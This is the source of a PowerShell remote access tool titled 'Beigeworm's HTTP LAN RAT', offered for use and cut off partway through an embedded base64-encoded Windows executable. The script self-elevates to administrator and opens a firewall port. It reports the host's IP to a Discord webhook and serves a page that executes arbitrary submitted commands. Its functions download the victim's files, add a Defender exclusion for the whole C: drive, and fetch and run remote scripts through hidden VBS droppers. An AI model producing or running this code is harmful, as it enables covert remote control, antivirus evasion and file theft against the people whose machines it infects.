<#
============================== Beigeworm's HTTP LAN RAT ===============================

**THIS SCRIPT MUST BE EXECUTED AS ADMIN TO OPEN PORTS.**

SYNOPSIS
This script opens port 5000 on the machine and serves a simple webpage with powershell fuctions that can be executed.
Attacker device must be on the same local area network.
OPTIONAL - edit $whuri to you discord webhook to get a notification of the machines local IP

INSTRUCTIONS
Change all occurunces of WEBHOOK_HERE to a discord webhook
(Setup instructions here - https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/blob/main/README.md)
Run script and input given URL in a browser on another device.

#>

$whuri = "WEBHOOK_HERE"

#============================================================ OPEN MESSAGE ====================================================================
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
Write-Host "=======================================================================================" -ForegroundColor Green -BackgroundColor Black
Write-Host "============================= Simple HTTP File Server =================================" -ForegroundColor Green -BackgroundColor Black
Write-Host "=======================================================================================`n" -ForegroundColor Green -BackgroundColor Black
Write-Host "More info at : https://github.com/beigeworm" -ForegroundColor DarkGray
Write-Host "This script will start a HTTP fileserver with the contents of this folder.`n"
sleep 1

#============================================================ SERVER SETUP ====================================================================

Write-Host "================================== Server Setup =======================================" -ForegroundColor Green
Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

#============================================================ USER PERMISSIONS ====================================================================

Write-Host "Checking User Permissions.." -ForegroundColor DarkGray

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Admin privileges needed for this script..." -ForegroundColor Red
    Write-Host "This script will self elevate to run as an Administrator and continue." -ForegroundColor DarkGray
    Write-Host "Sending User Prompt."  -ForegroundColor Green
    sleep 1
    Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
    exit
    }
    else{
    sleep 1
    if (-Not (Test-Path -Path "$env:temp/homepath.txt")){
    }
    }


$fpath = $env:USERPROFILE
$fpath | Out-File -FilePath "$env:temp/homepath.txt"


#============================================================ DETECT NETWORK HARDWARE ====================================================================

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'Wi*' -or  $_.Name -match 'Eth*'}
$primaryInterface = $filteredInterfaces | Select-Object -First 1
if ($primaryInterface) {
    if ($primaryInterface.Name -match 'Wi*') {
        Write-Output "Wi-Fi is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
    } elseif ($primaryInterface.Name -match 'Eth*') {
        Write-Output "Ethernet is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
    } else {
        Write-Output "Unknown primary internet connection."
    }
    } else {Write-Output "No primary internet connection found."}


#============================================================ OPEN PORT 5000 ON WINDOWS ====================================================================

Write-Host "Server Started at : http://localhost:5000/"
Write-Host "Opening port 5000 on the local machine" -ForegroundColor DarkGray
Write-Host "Setup Complete! `n" -ForegroundColor Green
Write-Host "=================================== Server Details ===================================="  -ForegroundColor Green
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow
Write-Host "===================================== Folder Setup ===================================="  -ForegroundColor Green
Write-Host "Checking folder path.." -ForegroundColor DarkGray
$hpath = Get-Content -Path "$env:temp/homepath.txt"
cd "$hpath"

$escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

$httpsrvlsnr = New-Object System.Net.HttpListener;
$httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
$httpsrvlsnr.Prefixes.Add("http://localhost:5000/");
$httpsrvlsnr.Start();

#============================================================ SET PATH TO GIVEN FOLDER ====================================================================
Write-Host "Setting folder root as : $hpath `n" 
$webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
[byte[]]$buffer = $null
Write-Host "=======================================================================================" -ForegroundColor Green
Write-Host "==============================   HTTP SERVER STARTED   ================================" -ForegroundColor Green
Write-Host "=======================================================================================`n" -ForegroundColor Green
Write-Host ("Network Devices Can Reach the server at : http://"+$loip+":5000")
Write-Host "`n"
Remove-Item -Path "$env:temp/homepath.txt" -Force
#============================================================ SERVE WEBPAGE TO URL ====================================================================
function Format-FileSize {
    param([long]$Size)
    $Units = "bytes", "Kb", "Mb", "Gb"
    $Index = 0
    while ($Size -ge 1024 -and $Index -lt 4) {
        $Size = $Size / 1024
        $Index++
    }
    "{0:N2} {1}" -f $Size, $Units[$Index]
}
Function DisplayWebpage {
    $html = "<html><head><style>"
    $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #7c7d71; }"
    $html += "h1 { color: #000; }"
    $html += ".container { display: flex; align-items: center; }"
    $html += "a { color: #000; text-decoration: none; font-size: 16px; padding-left: 10px; }"
    $html += "a:hover { text-decoration: underline; }"
    $html += "table { border-collapse: collapse; width: 100%; border: 1px solid #ddd; }"
    $html += "th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }"
    $html += "tr:hover { background-color: #909090; }"
    $html += "thead { background-color: #909090; }"
    $html += "ul { list-style-type: none; padding-left: 0; }"
    $html += "li { margin-bottom: 5px; }"
    $html += "textarea { width: 80%; padding: 10px; font-size: 14px; }"
    $html += "input[type='submit'] { position: relative; top: -12px; margin-left: 30px; padding: 10px 20px; background-color: #cf2b2b; color: #FFF; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }"
    $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
    $html += ".stop-button { position: relative; top: -5px; font-size: 18px; margin-left: 30px; background-color: #cf2b2b; color: #FFF; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }"
    $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"
    $html += "</style></head><body>"
    $html += "<div class='container'><h1> Simple HTTP Server</h1><a href='/stop'><button class='stop-button'>STOP SERVER</button></a></div><ul>"
    $html += "<h3> Root Folder Path : $folderPath </h3><ul>"
    $html += "<h3>Functions</h3><ul>"
    $html += "<li><a href='/mini'><button>Minimize All Apps</button></a></li>"
    $html += "<li><a href='/update'><button>Send Fake Update</button></a></li>"
    $html += "<li><a href='/playgif'><button>Open GIF Player</button></a></li>"
    $html += "<li><a href='/disableav'><button>Nerf Defender</button></a></li>"
    $html += "<li><a href='/wallpaper'><button>Wallpaper Jumpscare</button></a></li>"
    $html += "<li><a href='/acid'><button>Memz Graphic Effects</button></a></li>"
    $html += "<li><a href='/sound'><button>Play All Windows Sounds</button></a></li>"
    $html += "<li><a href='/dark'><button>Enable Dark Mode</button></a></li>"
    $html += "<li><a href='/light'><button>Enable Light Mode</button></a></li>"
    $html += "<li><a href='/rroll'><button>Start RickRoll</button></a></li>"
    $html += "<li><a href='/joke'><button>Tell a Dad Joke</button></a></li>"
    $html += "<li><a href='/inputon'><button>Enable Mouse and Keyboard</button></a></li>"
    $html += "<li><a href='/inputoff'><button>Disable Mouse and Keyboard</button></a></li>"
    $html += "</ul><ul>"
    $html += "<h3>Command Input</h3>"
    $html += "<form method='post' action='/execute'>"
    $html += "<span><textarea name='command' rows='1' cols='80'></textarea><input type='submit' value='Execute'></span><br>"
    $html += "</form>"
    $html += "<h3>Output</h3><pre name='output' rows='10' cols='80'>$output</pre></ul>"
    $html += "<ul><table>"
    $html += "<thead><tr><th> FOLDERS</th></tr></thead><tbody>"
    foreach ($file in $files) {
        $fileUrl = $file.FullName.Replace(' ', '%20') -replace [regex]::Escape($PWD.Path.Replace(' ', '%20')), ''
        $fileDetails = "<td>$(Format-FileSize $file.Length)</td><td>$($file.Extension)</td><td>$($file.CreationTime)</td><td>$($file.LastWriteTime)</td>"
        if ($file.PSIsContainer) {
            $html += "<tr><td><a href='/browse$fileUrl'><button>Open Folder</button></a><a>$file</a></td></tr>"
        }
        else{
        }}
    $html += "</tbody></table>"
    $html += "<ul><table>"
    $html += "<thead><tr><th> FILES</th><th>Size</th><th>Type</th><th>Created</th><th>Last Modified</th></tr></thead><tbody>"
    foreach ($file in $files) {
        $fileUrl = $file.FullName.Replace(' ', '%20') -replace [regex]::Escape($PWD.Path.Replace(' ', '%20')), ''
        $fileDetails = "<td>$(Format-FileSize $file.Length)</td><td>$($file.Extension)</td><td>$($file.CreationTime)</td><td>$($file.LastWriteTime)</td>"
        if ($file.PSIsContainer){} 
        else {
            $html += "<tr><td><a href='/download$fileUrl'><button>Download</button></a><a>$file</a></td>$fileDetails</tr>"
        }}
    $html += "</tbody></table>"
    $html += "</ul>"
    $html += "</body></html>"
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
    $ctx.Response.ContentLength64 = $buffer.Length;
    $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
}

while ($httpsrvlsnr.IsListening){try {$ctx = $httpsrvlsnr.GetContext();

    if ($ctx.Request.RawUrl -eq "/") {
        $files = Get-ChildItem -Path $PWD.Path -Force
        $folderPath = $PWD.Path
        DisplayWebpage
    }
    elseif ($ctx.Request.RawUrl -eq "/stop") {
        $httpsrvlsnr.Stop();
        Remove-PSDrive -Name webroot -PSProvider FileSystem;
    }
    elseif ($ctx.Request.RawUrl -match "^/download/.+") {
            $filePath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl.Replace('%20', ' ') -replace "^/download", "")
            if ([System.IO.File]::Exists($filePath)) {
                $fileInfo = Get-Item -Path $filePath
                $ctx.Response.ContentType = 'application/octet-stream'
                $ctx.Response.ContentLength64 = $fileInfo.Length
                $fileStream = [System.IO.File]::OpenRead($filePath)
                $buffer = New-Object byte[] 4096
                $totalBytesRead = 0
                while ($totalBytesRead -lt $fileInfo.Length) {
                    $bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)
                    $ctx.Response.OutputStream.Write($buffer, 0, $bytesRead)
                    $ctx.Response.OutputStream.Flush()
                    $totalBytesRead += $bytesRead
                    $progressPercentage = [Math]::Round(($totalBytesRead / $fileInfo.Length) * 100, 0)
                    Write-Progress -Activity "Downloading $($fileInfo.Name)" -Status "$progressPercentage% Complete" -PercentComplete $progressPercentage
                    if ($totalBytesRead -eq $fileInfo.Length) {
                        Write-Progress -Activity "Downloading $($fileInfo.Name)" -Completed
                    }}
                Write-Host "A User Downloaded : $filePath" -ForegroundColor Green
                $ctx.Response.OutputStream.Close()
                $fileStream.Close()
            }}
    elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POST") {
            $reader = New-Object IO.StreamReader $ctx.Request.InputStream,[System.Text.Encoding]::UTF8
            $postParams = $reader.ReadToEnd()
            $reader.Close()
            $command = $postParams.Split('=')[1] -replace "%20", " "
            $output = Invoke-Expression $command | Out-String
            $files = Get-ChildItem -Path $PWD.Path -Force
            $folderPath = $PWD.Path
            DisplayWebpage
        }
     elseif ($ctx.Request.RawUrl -match "^/update") {     
    $tobat = @'
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run "C:\Windows\System32\scrnsave.scr"
    WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
    WScript.Sleep 200
    WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 10
    Write-Output "Done."
    Remove-Item -Path $pth -Force
    }
    elseif ($ctx.Request.RawUrl -match "^/playgif") {     
    $tobat = @'
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WScript.Sleep 200
    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/GIF-Play.ps1 | iex", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1010.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 10
    Write-Output "Done."
    Remove-Item -Path $pth -Force
    }
    elseif ($ctx.Request.RawUrl -match "^/disableav") {
    Add-MpPreference -ExclusionPath C:/
    Write-Output "Done."
    }
    elseif ($ctx.Request.RawUrl -match "^/wallpaper") {     
    $tobat = @'
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WScript.Sleep 200
    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/wallpaper.ps1 | iex", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1019.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 10
    Write-Output "Done."
    Remove-Item -Path $pth -Force
    }
    elseif ($ctx.Request.RawUrl -match "^/acid") {     
    $b64 = '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CAAoACABCAAsAAcBCQBcACUBCQBgACoBCQBkAC8BCQBoADQBCQBsADkBCQBwAD4BCQB0AEMBCQB4AEgBCQB8AE0BCQCAAFIBCQCEAFcBCQCIAFwBCQCMAGEBCQCQAGYBCQCUAGsBCQCYAPgALgALAFUCLgATAF4CLgAbAH0CLgAjAIYCFQBwARkAcAEVACIAOgCIAMIA0QDcADEESAQaBD0ECABTBCQEBQMDAPoAAQBAAQUAWwACAEABBwA1AAMAAAEJAGgHAwAAAQsAUwcDAEABDQDeBwMAAAEPAE4FAwAAAREALgIDAAABEwBtCAIAAAEVAGEAAgAAARcAEwcCAAABGQBIAAQAAAEbALgDAwAAAR0A5AEDAAABHwDMBwMAAAEhAMUHAwAAASMA1wcDAAABJQBSAAMAAAEnADgCBQAAASkAUQIFAEABKwDTBgYAQAEtAA8CBwAEgAAAAAAAAAAAAAAAAAAAAABXCAAABAAAAAAAAAAAAAAA4QBUAQAAAAAEAAAAAAAAAAAAAADqAKkDAAAAAAQAAAAAAAAAAAAAAOEAaQYAAAAAAwACAAQAAgAFAAIAAAAAQ2xhc3MxAGtlcm5lbDMyAEdESV9wYXlsb2FkczIAPE1vZHVsZT4AQUNfU1JDX0FMUEhBAENyZWF0ZUNvbXBhdGlibGVEQwBSZWxlYXNlREMARGVsZXRlREMAR2V0REMAR2V0V2luZG93REMAU1JDQU5EAE5PVFNSQ0VSQVNFAEJMRU5ERlVOQ1RJT04AQUNfU1JDX09WRVIAV0hJVEVORVNTAEJMQUNLTkVTUwBDQVBUVVJFQkxUAFNSQ1BBSU5UAE1FUkdFUEFJTlQAUEFUUEFJTlQAUE9JTlQAU1JDSU5WRVJUAFBBVElOVkVSVABEU1RJTlZFUlQARXh0cmFjdEljb25FeFcAZ2V0X1gATk9UU1JDQ09QWQBNRVJHRUNPUFkAUEFUQ09QWQBnZXRfWQB2YWx1ZV9fAFNvdXJjZUNvbnN0YW50QWxwaGEAYWxwaGEAbXNjb3JsaWIARnJvbUhkYwBoZGMAblhTcmMAbllTcmMAaGRjU3JjAG5XaWR0aFNyYwBuWE9yaWdpblNyYwBuWU9yaWdpblNyYwBuSGVpZ2h0U3JjAEdlbmVyaWNSZWFkAEZpbGVTaGFyZVJlYWQAVGhyZWFkAGdldF9SZWQAbHBPdmVybGFwcGVkAGhXbmQAR2RpQWxwaGFCbGVuZABod25kAGR3U2hhcmVNb2RlAElEaXNwb3NhYmxlAENsb3NlSGFuZGxlAGhIYW5kbGUARnJvbUhhbmRsZQBSZWN0YW5nbGUAQ3JlYXRlRmlsZQBoVGVtcGxhdGVGaWxlAFdyaXRlRmlsZQBoRmlsZQBzRmlsZQBmaWxlAGxwRmlsZU5hbWUAVmFsdWVUeXBlAGJFcmFzZQBGaWxlRmxhZ0RlbGV0ZU9uQ2xvc2UARGlzcG9zZQBHZW5lcmljV3JpdGUARmlsZVNoYXJlV3JpdGUAbk51bWJlck9mQnl0ZXNUb1dyaXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAVGFyZ2V0RnJhb